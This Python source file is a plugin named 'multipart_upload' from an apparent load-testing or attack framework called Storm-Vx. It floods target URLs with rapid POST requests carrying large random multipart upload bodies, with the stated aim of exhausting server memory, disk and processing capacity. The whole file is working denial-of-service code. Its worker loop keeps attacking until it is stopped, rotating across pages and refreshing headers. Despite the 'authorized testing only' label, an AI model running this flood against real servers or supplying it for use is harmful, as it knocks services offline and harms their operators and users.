#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vf_multipart_upload — Multipart Upload Flood Attack Plugin

Sends rapid POST requests with large multipart/form-data payloads
to exhaust server memory, disk I/O, and processing capacity.
Part of the Storm-Vx plugin architecture.

FOR AUTHORIZED TESTING ONLY!
"""

from __future__ import annotations

import asyncio
import time
import random
import io
from typing import Dict, Any


from plugin_system import PluginMeta, AttackContext
from tester.vf_attack_base import AttackPlugin
from vf_common import C, rand_str
import aiohttp


__all__ = ["MultipartUploadPlugin"]


class MultipartUploadPlugin(AttackPlugin):
    """Multipart Upload Flood — upload large form data to exhaust resources.

    Generates multipart/form-data POST requests with large random
    payloads simulating file uploads. Each request carries a
    significant body, consuming server bandwidth, memory for
    buffering, and potentially disk I/O for temporary files.
    """

    meta = PluginMeta(
        name='multipart_upload',
        version='1.0.0',
        plugin_type='attack',
        description='Multipart upload — large form-data uploads to exhaust server memory/disk',
        tags=['http', 'upload', 'multipart', 'memory-burn', 'flood'],
        priority=41,
        compatible_profiles=[],
        requirements=['aiohttp'],
    )

    @staticmethod
    def _build_multipart(boundary: str, chunk_kb: int = 64) -> bytes:
        """Build a multipart/form-data body with random data."""
        buf = io.BytesIO()

        # File field with random data
        file_data = rand_str(chunk_kb * 1024).encode('utf-8')
        buf.write(f"--{boundary}\r\n".encode())
        buf.write(f'Content-Disposition: form-data; name="file"; filename="data_{rand_str(6)}.bin"\r\n'.encode())
        buf.write(b"Content-Type: application/octet-stream\r\n\r\n")
        buf.write(file_data)
        buf.write(b"\r\n")

        # Text fields
        for field_name in ["description", "title", "metadata", "tags"]:
            buf.write(f"--{boundary}\r\n".encode())
            buf.write(f'Content-Disposition: form-data; name="{field_name}"\r\n\r\n'.encode())
            buf.write(f"{rand_str(32)}\r\n".encode())

        buf.write(f"--{boundary}--\r\n".encode())
        return buf.getvalue()

    async def _worker_loop(self, context: AttackContext, worker_id: int) -> None:
        """Multipart upload worker: POST with large multipart bodies."""
        _ssl = context.ssl_param

        pages = context.page_targets or [context.url]
        delay_ms = context.extra.delay_ms
        upload_kb = getattr(context.extra, 'upload_kb', 64)

        while not self._stop_event.is_set():
            try:
                url = random.choice(pages)
                boundary = f"----StormVxBoundary{rand_str(12)}"
                headers = self._get_fresh_headers(context, "api")
                headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"

                body = self._build_multipart(boundary, chunk_kb=upload_kb)

                t = time.monotonic()
                try:
                    async with context.session.post(url, headers=headers, data=body,
                                                    ssl=_ssl, allow_redirects=False) as resp:
                        rt = time.monotonic() - t
                        ok = resp.status < 500
                        await self._record("UPLOAD", ok, resp.status, rt, url=url[:60])
                except asyncio.CancelledError:
                    raise
                except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                    rt = time.monotonic() - t
                    await self._record("UPLOAD", False, 0, rt,
                                       err=type(exc).__name__, url=url[:60])

                if delay_ms > 0:
                    await asyncio.sleep(delay_ms / 1000.0)

            except asyncio.CancelledError:
                return
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                await self._record("UPLOAD", False, 0, 0, err=type(exc).__name__)
                await asyncio.sleep(0.1)

